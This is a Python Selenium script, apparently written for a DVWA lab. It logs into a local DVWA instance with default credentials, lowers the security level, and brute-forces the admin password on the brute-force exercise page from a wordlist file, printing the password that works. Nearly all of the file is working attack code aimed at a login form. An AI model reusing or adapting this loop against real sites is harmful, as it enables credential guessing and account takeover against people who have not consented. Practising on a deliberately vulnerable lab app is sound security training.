from selenium import webdriver
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.common.exceptions import WebDriverException

options = FirefoxOptions()
service = FirefoxService(executable_path='/usr/local/bin/geckodriver')  # Update path if needed
driver = webdriver.Firefox(service=service, options=options)

driver.get("http://192.168.159.129/dvwa/")

username = 'admin'
password = 'password'

# Wait for username field to be present
WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, 'username')))
username_field = driver.find_element(By.NAME, 'username')
password_field = driver.find_element(By.NAME, 'password')

username_field.send_keys(username)
password_field.send_keys(password)

# Wait for login button to be present and click it
login_button = driver.find_element(By.NAME, 'Login')
login_button.click()

# Wait for the security page to be present
driver.get("http://192.168.159.129/dvwa/security.php")
WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, 'security')))

select_element = driver.find_element(By.NAME, 'security')
select = Select(select_element)
select.select_by_value('low')

submit_button = driver.find_element(By.NAME, 'seclev_submit')
submit_button.click()

# Function to read passwords from file
def read_passwords_file(filename):
    password_list = []
    with open(filename, 'r') as file:
        for line in file:
            password = line.strip()
            password_list.append(password)
    return password_list

file_path = 'common_passwords_unique.txt'
passwords = read_passwords_file(file_path)

# Brute force login attempts with retry logic
for pw in passwords:
    user = 'admin'
    max_retries = 5
    for attempt in range(max_retries):
        try:
            driver.get(f"http://192.168.159.129/dvwa/vulnerabilities/brute/?username={user}&password={pw}&Login=Login#")
            WebDriverWait(driver, 20).until(
                lambda d: d.execute_script('return document.readyState') == 'complete'
            )
            get_source = driver.page_source
            break
        except WebDriverException as e:
            if attempt < max_retries - 1:
                print(f"Retrying {pw} ({attempt + 1}/{max_retries}) due to {e}")
                
            else:
                print(f"Failed to load the page for {pw} after several retries.")
                continue

    target_text = 'Welcome to the password protected area'
    if target_text in get_source:
        print(f'User: {user}, password: {pw}')
        break

driver.quit()
